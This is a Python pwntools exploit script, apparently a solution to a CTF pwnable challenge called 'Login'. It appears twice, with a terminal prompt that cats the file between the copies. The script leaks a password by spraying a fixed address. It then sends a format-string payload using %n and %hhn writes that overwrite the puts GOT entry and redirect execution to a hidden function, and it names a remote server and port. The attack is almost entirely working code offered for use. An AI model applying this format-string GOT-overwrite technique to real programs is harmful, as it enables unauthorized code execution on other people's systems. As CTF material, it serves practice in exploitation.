#-*- coding:utf-8 -*-
from pwn import *

server = "107.191.61.245"
port   = 20200

pw_addr = 0x400be8

r = process("./login")
#r = remote(server, port)

print r.recv()

payload = p64(pw_addr) * 40
r.send(payload)

recv = r.recv()
print recv
#recv = r.recv()
passwd = recv.split("**: ")[1].split(" ")[0]
print "[*] password : {}".format(passwd)

r.close()

secret_action = 0x400a2c
secret_action = 0x400876
#r = remote(server, port)
r = process("./login")

print r.recv()

r.send(passwd)
print r.recvuntil("action\n")

puts_got = 0x602020

r.sendline("1")
print r.recv()


payload = "%40$n"
payload += "Z" * 0x8 # 08
payload += "%41$hhn"
payload += "Z" * (0x40 - 0x8) # 0x40
payload += "%42$hhn"
payload += "Z" * (0x76 - 0x40) # 0x76
payload += "%43$hhn"
payload += "Z" * (255 - len(payload)) + "\x00"
payload += p64(puts_got+3)
payload += p64(puts_got+1)
payload += p64(puts_got+2)
payload += p64(puts_got)

r.send(payload)
print r.recv()
print r.recv()

tbkim@ubuntu:~/ctf_tendollar/hackability/pwnable/Login$ cat sol_goblin.py
#-*- coding:utf-8 -*-
from pwn import *

server = "107.191.61.245"
port   = 20200

pw_addr = 0x400be8

r = process("./login")
#r = remote(server, port)

print r.recv()

payload = p64(pw_addr) * 40
r.send(payload)

recv = r.recv()
print recv
#recv = r.recv()
passwd = recv.split("**: ")[1].split(" ")[0]
print "[*] password : {}".format(passwd)

r.close()

secret_action = 0x400a2c
secret_action = 0x400876
#r = remote(server, port)
r = process("./login")

print r.recv()

r.send(passwd)
print r.recvuntil("action\n")

puts_got = 0x602020

r.sendline("1")
print r.recv()


payload = "%40$n"
payload += "Z" * 0x8 # 08
payload += "%41$hhn"
payload += "Z" * (0x40 - 0x8) # 0x40
payload += "%42$hhn"
payload += "Z" * (0x76 - 0x40) # 0x76
payload += "%43$hhn"
payload += "Z" * (255 - len(payload)) + "\x00"
payload += p64(puts_got+3)
payload += p64(puts_got+1)
payload += p64(puts_got+2)
payload += p64(puts_got)

r.send(payload)
print r.recv()
print r.recv()